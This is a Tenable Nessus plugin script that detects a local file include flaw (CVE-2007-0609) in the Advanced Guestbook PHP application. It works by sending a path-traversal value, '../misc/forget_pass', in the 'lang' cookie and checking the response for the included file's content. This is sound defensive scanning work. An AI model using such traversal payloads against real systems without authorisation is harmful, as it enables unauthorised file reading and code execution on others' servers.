#
# (C) Tenable Network Security, Inc.
#


include("compat.inc");

if (description)
{
  script_id(25170);
  script_version("$Revision: 1.8 $");

  script_cve_id("CVE-2007-0609");
  script_bugtraq_id(23876);
  script_xref(name:"OSVDB", value:"33879");

  script_name(english:"Advanced Guestbook index.php lang Cookie Variable Path Disclosure");
  script_summary(english:"Tries to execute a local file");
 
 script_set_attribute(attribute:"synopsis", value:
"The remote web server contains a PHP application that is affected by a
local file include vulnerability." );
 script_set_attribute(attribute:"description", value:
"The remote host is running Advanced Guestbook, a free guestbook
written in PHP. 

The installed version of Advanced Guestbook fails to validate input to
the 'lang' cookie before using it as a language template.  An
unauthenticated remote attacker may be able to exploit these issues to
view arbitrary files or to execute arbitrary PHP code on the remote
host, subject to the privileges of the web server user id." );
 script_set_attribute(attribute:"see_also", value:"http://www.netvigilance.com/advisory0013" );
 script_set_attribute(attribute:"see_also", value:"http://archives.neohapsis.com/archives/bugtraq/2007-05/0094.html" );
 script_set_attribute(attribute:"solution", value:
"Unknown at this time." );
 script_set_attribute(attribute:"cvss_vector", value: "CVSS2#AV:N/AC:H/Au:N/C:P/I:P/A:P" );
script_end_attributes();


  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2007-2009 Tenable Network Security, Inc.");

  script_dependencies("http_version.nasl");
  script_exclude_keys("Settings/disable_cgi_scanning");
  script_require_ports("Services/www", 80);

  exit(0);
}

include("global_settings.inc");
include("misc_func.inc");
include("http.inc");


port = get_http_port(default:80);
if (!can_host_php(port:port)) exit(0);


# Loop through various directories.
if (thorough_tests) dirs = list_uniq(make_list("/guestbook", "/gbook", "/gb", cgi_dirs()));
else dirs = make_list(cgi_dirs());

foreach dir (dirs)
{
  # Try to execute the application's misc/forget_pass.php.
  file = "../misc/forget_pass";
  set_http_cookie(name: 'lang', value: file);
  r = http_send_recv3(port: port, method: 'GET', item: strcat(dir, '/'));
  if (isnull(r)) exit(0);
  # There's a problem if the request includes output from the file
  # we requested.
  if (
    "<title>Create new password" >< r[2] && 
    'href="http://www.proxy2.de"' >< r[2]
  )
  {
    security_warning(port);
    exit(0);
  }
}
